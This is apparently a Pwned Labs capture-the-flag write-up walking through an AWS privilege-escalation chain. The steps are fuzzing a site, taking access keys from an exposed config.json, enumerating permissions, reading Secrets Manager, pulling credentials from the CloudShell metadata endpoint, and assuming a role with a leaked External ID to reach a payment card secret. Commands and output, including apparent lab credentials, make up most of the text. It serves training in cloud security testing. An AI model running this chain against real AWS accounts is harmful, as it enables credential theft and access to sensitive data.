#PwnedLabs - Assume Privileged Role with External ID

In this lab the goal is to assume privilege by utilizing an External ID that we find throughout our reconnaissance.

We found the IP 52.0.51.234 as our entry point and we would like to navigate laterally throughout their system, and determine any potential areas of impact.

First start off with an nmap scan of the target
```
nmap -Pn 52.0.52.234
```

We can fuzz the website to find any stored files that could be useful to us. Be sure to install ffuzz, feel free to use my auto deploy script, in the repo.

To get a wordlist for this lab, I will be using this wordlist
```
wget https://raw.githubusercontent.com/v0re/dirb/master/wordlists/small.txt
```

Now that we have our wordlist, let's run fuzz the site:
```
ffuf -w small.txt -u http://52.0.51.234/FUZZ -e .conf,.txt,.json,.xml,.yml,.yaml,.env -mc 200,301 2>/dev/null
config.json             [Status: 200, Size: 832, Words: 141, Lines: 21, Duration: 51ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 49ms]
img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 47ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 47ms]
```

In our results we see config.json so let's curl that result real quick:
```
curl http://52.0.51.234/config.json
{"aws": {
        "accessKeyID": "AKIAWHEOTHRFYM6CAHHG",
        "secretAccessKey": "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",
        "region": "us-east-1",
        "bucket": "hl-data-download",
        "endpoint": "https://s3.amazonaws.com"
    },
    "serverSettings": {
        "port": 443,
        "timeout": 18000000
    },
    "oauthSettings": {
        "authorizationURL": "https://auth.hugelogistics.com/ms_oauth/oauth2/endpoints/oauthservice/authorize",
        "tokenURL": "https://auth.hugelogistics.com/ms_oauth/oauth2/endpoints/oauthservice/tokens",
        "clientID": "1012aBcD3456EfGh",
        "clientSecret": "aZ2x9bY4cV6wL8kP0sT7zQ5oR3uH6j",
        "callbackURL": "https://portal.huge-logistics/callback",
        "userProfileURL": "https://portal.huge-logistics.com/ms_oauth/resources/userprofile/me"
    }
}
```

Our curl shows us some creds that we can leverage to go further in this lab. 

```
aws configure --profile apr
AWS Access Key ID [None]: AKIAWHEOTHRFYM6CAHHG
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
```

After setting the creds we can take a look at who we are:
```
aws sts get-caller-identity --profile apr
{
    "UserId": "AIDAWHEOTHRF7MLFMRGYH",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/data-bot"
}
```
We have assume the role of the user data-bot, this user was associated with the s3 bucket from the site so maybe we can find something out?

```
aws s3 ls hl-data-download --profile apr
2023-08-05 17:56:58       5200 LOG-1-TRANSACT.csv
2023-08-05 17:57:05       5200 LOG-10-TRANSACT.csv
2023-08-05 17:58:04       5200 LOG-100-TRANSACT.csv
2023-08-05 17:57:05       5200 LOG-11-TRANSACT.csv
2023-08-05 17:57:06       5200 LOG-12-TRANSACT.csv
2023-08-05 17:57:07       5200 LOG-13-TRANSACT.csv
2023-08-05 17:57:08       5200 LOG-14-TRANSACT.csv
2023-08-05 17:57:08       5200 LOG-15-TRANSACT.csv
...
```

Let's take a look at these files and see if they yield anything.
```
aws s3 cp s3://hl-data-download/LOG-1-TRANSACT.csv - --profile apr
Bx8w4Pky82Z19,HL-CUST-ORDER-0751,USD,15000,APPROVED
2R8mHt3eZNJQx,HL-CUST-ORDER-8604,USD,15000,APPROVED
Ek0k74vQDhHUd,HL-CUST-ORDER-1962,USD,15000,APPROVED
u2NQYYTBAjG8B,HL-CUST-ORDER-1642,USD,15000,APPROVED
W2RYflhi2BfjF,HL-CUST-ORDER-4037,USD,15000,APPROVED
PubhFWge7qcDU,HL-CUST-ORDER-6051,USD,15000,APPROVED
UhI69Dsk6uhgs,HL-CUST-ORDER-0529,USD,15000,APPROVED
XObtFax8b0t1o,HL-CUST-ORDER-2706,USD,15000,APPROVED
PfA3yd2F8GBVS,HL-CUST-ORDER-4431,USD,15000,APPROVED
JhFJuR3awbxOM,HL-CUST-ORDER-9252,USD,15000,APPROVED
```

So the info here is great but its not what we are looking for, maybe for some pentesters trying to get some sensitive data maybe, but not us. Let's see what else this user has access to with aws-enumerator.
```
aws-enumerator enum --services all
Message:  Successful APPMESH: 0 / 1
Message:  Successful ACM: 0 / 1
Message:  Successful APIGATEWAY: 0 / 8
Message:  Successful AMPLIFY: 0 / 1
Message:  Successful APPSYNC: 0 / 1
Message:  Successful AUTOSCALING: 0 / 15
Message:  Successful CHIME: 0 / 1
Message:  Successful BACKUP: 0 / 7
Message:  Successful ATHENA: 0 / 3
Message:  Successful BATCH: 0 / 4
Message:  Successful CLOUD9: 0 / 2
Message:  Successful CLOUDFRONT: 0 / 5
Message:  Successful CLOUDFORMATION: 0 / 8
Message:  Successful CLOUDDIRECTORY: 0 / 4
Message:  Successful CLOUDHSMV2: 0 / 2
Message:  Successful CODECOMMIT: 0 / 2
Message:  Successful CLOUDSEARCH: 0 / 2
Message:  Successful CODEBUILD: 0 / 4
Message:  Successful CLOUDTRAIL: 0 / 1
Message:  Successful DATAPIPELINE: 0 / 1
Message:  Successful COMPREHEND: 0 / 8
Message:  Successful CODEDEPLOY: 0 / 8
Message:  Successful CODEPIPELINE: 0 / 3
Message:  Successful DATASYNC: 0 / 4
Message:  Successful DIRECTCONNECT: 0 / 9
Message:  Successful DLM: 0 / 1
Message:  Successful DAX: 0 / 4
Message:  Successful EKS: 0 / 1
Message:  Successful DYNAMODB: 1 / 5
Message:  Successful EC2: 0 / 74
Message:  Successful ECS: 0 / 8
Message:  Successful ECR: 0 / 2
Message:  Successful DEVICEFARM: 0 / 10
Message:  Successful FMS: 0 / 4
Message:  Successful ELASTICACHE: 0 / 10
Message:  Successful FIREHOSE: 0 / 1
Message:  Successful ELASTICTRANSCODER: 0 / 2
Message:  Successful ELASTICBEANSTALK: 0 / 8
Message:  Successful GREENGRASS: 0 / 10
Message:  Successful GLUE: 0 / 17
Message:  Successful GAMELIFT: 0 / 15
Message:  Successful FSX: 0 / 2
Message:  Successful GLOBALACCELERATOR: 0 / 2
Message:  Successful IOT: 0 / 30
Message:  Successful IAM: 0 / 20
Message:  Successful GUARDDUTY: 0 / 3
Message:  Successful INSPECTOR: 0 / 7
Message:  Successful HEALTH: 0 / 2
Message:  Successful KINESISVIDEO: 0 / 3
Message:  Successful KAFKA: 0 / 1
Message:  Successful KINESISANALYTICS: 0 / 1
Message:  Successful IOTANALYTICS: 0 / 5
Message:  Successful KINESIS: 0 / 4
Message:  Successful MACHINELEARNING: 0 / 4
Message:  Successful LIGHTSAIL: 0 / 19
Message:  Successful KMS: 0 / 3
Message:  Successful LAMBDA: 0 / 4
Message:  Successful MEDIAPACKAGE: 0 / 2
Message:  Successful MEDIACONNECT: 0 / 2
Message:  Successful MEDIASTORE: 0 / 2
Message:  Successful MEDIALIVE: 0 / 5
Message:  Successful MEDIACONVERT: 0 / 5
Message:  Successful MACIE: 0 / 2
Message:  Successful MEDIATAILOR: 0 / 1
Message:  Successful ORGANIZATIONS: 0 / 7
Message:  Successful MQ: 0 / 2
Message:  Successful PINPOINT: 0 / 1
Message:  Successful PRICING: 0 / 1
Message:  Successful RDS: 0 / 21
Message:  Successful MOBILE: 0 / 2
Message:  Successful RAM: 0 / 1
Message:  Successful POLLY: 0 / 3
Message:  Successful ROBOMAKER: 0 / 6
Message:  Successful REKOGNITION: 0 / 2
Message:  Successful OPSWORKS: 0 / 15
Message:  Successful ROUTE53DOMAINS: 0 / 3
Message:  Successful ROUTE53: 0 / 10
Message:  Successful REDSHIFT: 0 / 20
Message:  Successful SECURITYHUB: 0 / 8
Message:  Successful ROUTE53RESOLVER: 0 / 3
Message:  Successful SAGEMAKER: 0 / 15
Message:  Successful S3: 0 / 1
Message:  Successful SECRETSMANAGER: 1 / 2
Message:  Successful SHIELD: 0 / 7
Message:  Successful SNOWBALL: 0 / 5
Message:  Successful SIGNER: 0 / 3
Message:  Successful SERVICECATALOG: 0 / 7
Message:  Successful STS: 2 / 2
Message:  Successful STORAGEGATEWAY: 0 / 5
Message:  Successful SSM: 0 / 16
Message:  Successful SQS: 0 / 1
Message:  Successful SNS: 0 / 5
Message:  Successful SMS: 0 / 7
Message:  Successful TRANSFER: 0 / 1
Message:  Successful TRANSCRIBE: 0 / 2
Message:  Successful TRANSLATE: 0 / 1
Message:  Successful SUPPORT: 0 / 3
Message:  Successful WAF: 0 / 15
Message:  Successful XRAY: 0 / 5
Message:  Successful WORKMAIL: 0 / 1
Message:  Successful WORKSPACES: 0 / 8
Message:  Successful WORKDOCS: 0 / 3
Message:  Successful WORKLINK: 0 / 1
Message:  Successful CLOUDHSM: 0 / 6
Message:  Successful CODESTAR: 0 / 2
Time: 1m44.144619517s
Message:  Enumeration finished
```
Now that we have enumerated through all of the servicces, we see a little something with secretsmanager, let's go ahead and dump what is in there:
```
aws-enmumerator dump -services secretsmanager
--------------------------------------------- SECRETSMANAGER ---------------------------------------------

ListSecrets
```

Now that we have dumped them, let's use the AWS CLI to return the secrets to us:
```
aws secretsmanager list-secrets --query 'SecretList[*]. [Name, Description, ARN] --output json --profile apr
[
    [
        "employee-database-admin",
        "Admin access to MySQL employee database",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z"
    ],
    [
        "employee-database",
        "Access to MySQL employee database",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-rpkQvl"
    ],
    [
        "ext/cost-optimization",
        "Allow external partner to access cost optimization user and Huge Logistics resources",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4"
    ],
    [
        "billing/hl-default-payment",
        "Access to the default payment card for Huge Logistics",
        "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK"
    ]
]

```

Now although our attempt to retreive the secret here wasn't a major success, we were able to find a role that we can assume instead.

```
aws secretsmanager get-secret-value --secret-id ext/cost-optimization --profile apr
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
    "Name": "ext/cost-optimization",
    "VersionId": "f7d6ae91-5afd-4a53-93b9-92ee74d8469c",
    "SecretString": "{\"Username\":\"ext-cost-user\",\"Password\":\"K33pOurCostsOptimized!!!!\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-04T17:19:28.512000-04:00"
}

```

Using the info found here, as well as the account ID from when we ran get-caller-identity with our first profile, we can log in from the AWS Console with these creds!

Now that we're in the console, click on cloudshell and run the following commands:
```
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    44  100    44    0     0  51282      0 --:--:-- --:--:-- --:--:-- 44000
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
{
        "Type": "",
        "AccessKeyId": "ASIAWHEOTHRF3ZULKXDZ",        "SecretAccessKey": "g9Bet5R8f2m+HCC7+e8m7dpyAJQRQP60LNXz97jf",        "Token": "IQoJb3JpZ2luX2VjEOj//////////wEaCXVzLWVhc3QtMSJIMEYCIQCCwzcGYudHk8SO6I7BYizUZ+LTPnImABZ6qbd/BWOuewIhAKSVXqr+8t5mT7bmHjvlwD1ym6Mf/KatrMckPomcwjc8Kv8CCLH//////////wEQABoMNDI3NjQ4MzAyMTU1Igxk0vksTd3PfDeX+Lgq0wJp5LF4AFYzxUn1sk8LwhkdlfhjfiWM4Y61UwOFLReUk+L5tOj1lY7VnyHi5nerFtRBxhVMRMDtaLrFeIKwXxVQU3uOPfTbKlRkpyZLS9gIUPYGncygy7KKL/nKS6n1ZedFddbC0tcIgq7dZZVtyOJre8AbuGOo36VTYcsuvvhGbW/5QooqTBLwdEdzxsTDcZ7dq789DmXi2blR9XsF4hE6prhjjkl2KrfLk7QWqYIagSB57GzpOqyKIoJzWs50cdj9+zVJtP+/cha0iDEA5Kal+ms2OdtUcJW5Dnvp8ay6V7VCMzS34ZDdYFnv/u9cz0aL5g6JasrD9TdR+H5xh9MEx38SOJ3RKPICzFWGPsLTxZb0c1pjYtSSx0YGlp3f47WcibCesPbsnmG+Rw1UYAFtmvMAriNKwevLPA8Wb4GqIpVNW6feEqWR3KIiFaOXUf0aJOowiYDOygY6rAIObv2h2pffFYmuPUl5pQmL7MTIqpRVoCXy/SWZiikjxjjLJYO9i2OLCUq+QTwIkTa+1MuodH9RDTuUshyfktc/30vrb6aCj/Pw40kxFPZsz4+h6rAZO7Kbx9+9hsJ0A7kuW21R+AhXxbcGXkPKUORGVDGxHfRWPs/3NBBiaBWY/wPkSCMDy03E9K4I48Vd+LMLlIkwSgPCxu/xTyKOzdnK6KGDpxvptmOJERNPWsnXB9DYDf0Qpw/Jh7EuUPjE1VdEJRW+fY+BaGfmFoTRc431b91nFL+/teEAPbg+1lmMgSJNfxKXfLsqzkuBb0gXhByBg8zL4p1SpNfOF4wH6y6X8bQ7Ly5MRFPL7fIx4dywLTQpyNbl0gOdX8Dkg/hKv2CcFsu/UzjiAmOV6Hc=",
        "Expiration": "2025-12-30T07:47:49Z",
        "Code": "Success"
}
```

With this here, we gained creds for the ext/cost-optimization role! Let's run a couple of checks to see what we have available to us.

```
aws sts get-caller-identity --profile eco
{
    "UserId": "AIDAWHEOTHRFTNCWM7FHT",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/ext-cost-user"
}
```

```
aws iam list-attached-user-policies --user-name ext-cost-user --profile eco
{
    "AttachedPolicies": [
        {
            "PolicyName": "ExtCloudShell",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtCloudShell"
        },
        {
            "PolicyName": "ExtPolicyTest",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtPolicyTest"
        }
    ]
}
```

```
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --profile eco
{
    "Policy": {
        "PolicyName": "ExtPolicyTest",
        "PolicyId": "ANPAWHEOTHRF7772VGA5J",
        "Arn": "arn:aws:iam::427648302155:policy/ExtPolicyTest",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T21:47:26+00:00",
        "UpdateDate": "2023-08-06T20:23:42+00:00",
        "Tags": []
    }
}
```

```
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetRole",
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedRolePolicies",
                        "iam:ListAttachedUserPolicies",
                        "iam:GetRolePolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:policy/ExtPolicyTest",
                        "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
                        "arn:aws:iam::427648302155:policy/Payment",
                        "arn:aws:iam::427648302155:user/ext-cost-user"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-06T20:23:42+00:00"
    }
}
```

```
aws iam get-role --role-name ExternalCostOpimizeAccess --profile eco
{
    "Role": {
        "Path": "/",
        "RoleName": "ExternalCostOpimizeAccess",
        "RoleId": "AROAWHEOTHRFZP3NQR7WN",
        "Arn": "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
        "CreateDate": "2023-08-04T21:09:30+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::427648302155:user/ext-cost-user"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "sts:ExternalId": "37911"
                        }
                    }
                }
            ]
        },
        "Description": "Allow trusted AWS cost optimization partner to access Huge Logistics resources",
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {
            "LastUsedDate": "2025-12-28T20:21:02+00:00",
            "Region": "us-east-1"
        }
    }
}
```

```
aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Payment
{
    "Policy": {
        "PolicyName": "Payment",
        "PolicyId": "ANPAWHEOTHRFZCZIMJSVW",
        "Arn": "arn:aws:iam::427648302155:policy/Payment",
        "Path": "/",
        "DefaultVersionId": "v2",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T22:03:41+00:00",
        "UpdateDate": "2023-08-04T22:34:19+00:00",
        "Tags": []
    }
}
```

```
aws iam get-policy-version --policy-arn arn:aws:iam:427648302155:policy/Payment --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "secretsmanager:GetSecretValue",
                        "secretsmanager:DescribeSecret",
                        "secretsmanager:ListSecretVersionIds"
                    ],
                    "Resource": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "secretsmanager:ListSecrets",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-04T22:34:19+00:00"
    }
}
```

```
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::427648302155:user/ext-cost-user is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess
```

```
aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911
{
    "Credentials": {
        "AccessKeyId": "ASIAWHEOTHRF3RRPJZYQ",
        "SecretAccessKey": "JjrW5FsGvggI0XN3Qo9oivILwd9YG8EnPBSLZnsX",
        "SessionToken": "IQoJb3JpZ2luX2VjEOj//////////wEaCXVzLWVhc3QtMSJHMEUCIE7TOhWlfAkW2vG/WIvfGr3x4sZI4HV4tCfiT5HNU9CDAiEAy4kcBbaKBhmbzEdENnUIxaGBpS0Ubo+J52WAmrvqP24qrwIIsf//////////ARAAGgw0Mjc2NDgzMDIxNTUiDIyT4IuHGPJp61p3giqDApHnXw54D+DOl9h+d4UebE3k9V9PwRRNQoRIIL7EBUWaRtnc72Xl15XJPVSBd0QrgTbRWpJZRwv6M9B+8JaBzNYIJXHz8tr8VANeoHnNx0acWZiEdwA+z9PsY0mrMEGExbsPl+QIXkCzcGymw68hrl5FFv+TeotM9nIp7YOyGdC70aUlbc1ldET+ZUQfSa7hqldWNaoXHIkKsSM9K2w689Ldibnr1cceSvrpmUl4F/5imkZ55X26sDikN1qz7yweNrxo6eVuir1HKCIqoSZQ4X0FqVzfap4F6JSHf7u1HASyqV7gBDypiZEPz5vvKMnwThkR5mYmhkta2J0oIbW6lxMqbMsw4IXOygY6nQFeq33RgJl3wAjkWkiz7avfijCx3f0Or5GBj2GMAdlN848vTtxt21NpigEYZYA6cC90i9PWm7aCO4J9znCO6OP5GXI13oEYbTQq0yKVt02eLIR9evjdWTJvqzqXsGTnZhwuip5Zp5fvJKrdWRFx9GBsG1B9RxZhInS/edxDx9bi47KbHM9xkdQyMTG3S8meSwOc54UNwf6ZluxnGvep",
        "Expiration": "2025-12-30T08:44:32+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAWHEOTHRFZP3NQR7WN:ExternalCostOpimizeAccess",
        "Arn": "arn:aws:sts::427648302155:assumed-role/ExternalCostOpimizeAccess/ExternalCostOpimizeAccess"
    }
}
```

Let's set our final creds of this lab so we can get our flag!
```
aws configure --profile ecoa
AWS Access Key ID [None]: ASIAWHEOTHRF3RRPJZYQ
AWS Secret Access Key [None]: JjrW5FsGvggI0XN3Qo9oivILwd9YG8EnPBSLZnsX
Default region name [None]: us-east-1
Default output format [None]: 
(base) sultan@MacBookPro ~ % nano ~/.aws/credentials
(base) sultan@MacBookPro ~ % aws sts get-caller-identity --profile ecoa
{
    "UserId": "AROAWHEOTHRFZP3NQR7WN:ExternalCostOpimizeAccess",
    "Account": "427648302155",
    "Arn": "arn:aws:sts::427648302155:assumed-role/ExternalCostOpimizeAccess/ExternalCostOpimizeAccess"
}
```

```
aws secretsmanager get-secret-value --secret-id billing/hl-default-payment --profile ecoa
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
    "Name": "billing/hl-default-payment",
    "VersionId": "f8e592ca-4d8a-4a85-b7fa-7059539192c5",
    "SecretString": "{\"Card Brand\":\"VISA\",\"Card Number\":\"4180-5677-2810-4227\",\"Holder Name\":\"Michael Hayes\",\"CVV/CVV2\":\"839\",\"Card Expiry\":\"5/2026\",\"Flag\":\"68131559a7cee3e547d69046fdf425ca\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-04T18:33:39.867000-04:00"
}
```
